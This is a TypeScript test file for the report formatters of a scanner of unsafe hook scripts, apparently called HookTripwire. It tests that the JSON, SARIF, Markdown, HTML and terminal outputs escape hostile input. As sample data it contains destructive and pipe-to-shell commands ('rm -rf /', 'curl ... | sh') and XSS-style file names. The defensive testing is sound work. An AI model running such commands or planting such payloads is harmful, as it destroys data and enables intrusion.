import assert from "node:assert/strict";
import test from "node:test";
import { scanText } from "../src/engine.js";
import { formatHtml, formatJson, formatMarkdown, formatSarif, formatTerminal } from "../src/formatters.js";
import type { ScanResult } from "../src/types.js";

function resultFor(source: string, file = "hook.sh"): ScanResult {
  return {
    version: "0.1.0", scannedAt: "2026-01-01T00:00:00.000Z", root: "/tmp/project",
    filesScanned: 1, bytesScanned: Buffer.byteLength(source), findings: scanText(source, file),
    suppressedCount: 0, skippedFiles: [],
  };
}

test("JSON report is machine-readable", () => {
  const parsed = JSON.parse(formatJson(resultFor("rm -rf /"))) as { findings: unknown[] };
  assert.equal(parsed.findings.length, 1);
  assert.equal("hookPaths" in parsed, false);
});

test("SARIF 2.1 report includes fingerprints and regions", () => {
  const parsed = JSON.parse(formatSarif(resultFor("rm -rf /", "space #name.sh"))) as any;
  assert.equal(parsed.version, "2.1.0");
  assert.equal(parsed.runs[0].results[0].ruleId, "HG001");
  assert.equal(parsed.runs[0].results[0].locations[0].physicalLocation.region.startLine, 1);
  assert.equal(parsed.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri, "space%20%23name.sh");
  assert.match(parsed.runs[0].results[0].partialFingerprints.hooktripwireFingerprint, /^[a-f0-9]{24}$/);
  assert.equal("fixes" in parsed.runs[0].results[0], false);
  assert.match(parsed.$schema, /docs\.oasis-open\.org/);
});

test("Markdown escapes table delimiters", () => {
  const output = formatMarkdown(resultFor("curl https://bad.invalid/x | sh", "pipe|name.sh"));
  assert.ok(output.includes("pipe&#124;name.sh"));
  assert.ok(output.includes("HG002"));
});

test("Markdown neutralizes raw HTML and inline-code delimiters", () => {
  const output = formatMarkdown(resultFor('eval "$VALUE"', "`</code><img src=x>.sh"));
  assert.equal(output.includes("</code><img"), false);
  assert.ok(output.includes("&lt;/code&gt;&lt;img"));
});

test("HTML output escapes hostile paths and evidence", () => {
  const output = formatHtml(resultFor('eval "$<script>alert(1)</script>"', "<img src=x>.sh"));
  assert.equal(output.includes("<img src=x>"), false);
  assert.equal(output.includes("<script>alert(1)</script>"), false);
  assert.ok(output.includes("&lt;img src=x&gt;"));
});

test("HTML embedded JSON neutralizes script-closing characters", () => {
  const output = formatHtml(resultFor('eval "$VALUE"', "</script>.sh"));
  assert.equal(output.includes('"path":"</script>'), false);
  assert.ok(output.includes("HookTripwire"));
  assert.match(output, /Content-Security-Policy/);
  assert.match(output, /default-src 'none'/);
});

test("terminal output has no ANSI when colors are disabled", () => {
  const output = formatTerminal(resultFor("rm -rf /"), false);
  assert.ok(output.includes("HIGH"));
  assert.equal(output.includes("\u001b["), false);
});

test("terminal output renders hostile control bytes visibly", () => {
  const output = formatTerminal(resultFor("rm -rf /", "bad\u001b[2J.sh"), false);
  assert.equal(output.includes("\u001b[2J"), false);
  assert.ok(output.includes("\\u001b[2J"));
});

test("empty reports render in every human format", () => {
  const result = resultFor("echo safe");
  assert.ok(formatTerminal(result).includes("0 findings"));
  assert.ok(formatMarkdown(result).includes("No findings"));
  assert.ok(formatHtml(result).includes("No unsafe hook patterns"));
});

test("explicitly requested empty hook maps render without changing legacy results", () => {
  const legacy = resultFor("echo safe");
  assert.doesNotMatch(formatTerminal(legacy), /Hook execution paths/u);
  assert.doesNotMatch(formatMarkdown(legacy), /Hook execution paths/u);
  assert.doesNotMatch(formatHtml(legacy), /Hook execution paths/u);

  const mapped: ScanResult = { ...legacy, hookPaths: [] };
  assert.deepEqual((JSON.parse(formatJson(mapped)) as { hookPaths: unknown[] }).hookPaths, []);
  assert.match(formatTerminal(mapped), /No statically provable local hook paths/u);
  assert.match(formatMarkdown(mapped), /## Hook execution paths/u);
  assert.match(formatHtml(mapped), /id="hook-paths-title"/u);
});

test("hook paths associate visible findings and escape hostile display values", () => {
  const base = resultFor("rm -rf /", "leaf.sh");
  const hostile = "</code><img src=x>|`\n\u001b[2J";
  const mapped: ScanResult = {
    ...base,
    hookPaths: [{
      entry: { path: hostile, line: 2, column: 3 },
      hook: hostile,
      edges: [{
        from: { path: hostile, line: 2, column: 3 },
        launcher: "bash",
        reference: hostile,
        to: "leaf.sh",
      }],
      leaf: "leaf.sh",
      findingFingerprints: [base.findings[0]?.fingerprint ?? "missing", "dangling"],
      incomplete: "depth-limit",
    }],
  };

  const terminal = formatTerminal(mapped);
  assert.match(terminal, /Findings: HG001/u);
  assert.match(terminal, /Incomplete: depth-limit/u);
  assert.equal(terminal.includes("\u001b[2J"), false);
  assert.equal(terminal.includes("`\n\u001b"), false);
  assert.ok(terminal.includes("\\n\\u001b[2J"));

  const markdown = formatMarkdown(mapped);
  assert.equal(markdown.includes("</code><img"), false);
  assert.ok(markdown.includes("&lt;/code&gt;&lt;img"));
  assert.match(markdown, /HG001/u);

  const html = formatHtml(mapped);
  assert.equal(html.includes("<img src=x>"), false);
  assert.ok(html.includes("&lt;/code&gt;&lt;img src=x&gt;"));
  assert.match(html, /Hook execution paths/u);
  assert.deepEqual((JSON.parse(formatJson(mapped)) as { hookPaths: unknown[] }).hookPaths, mapped.hookPaths);
});
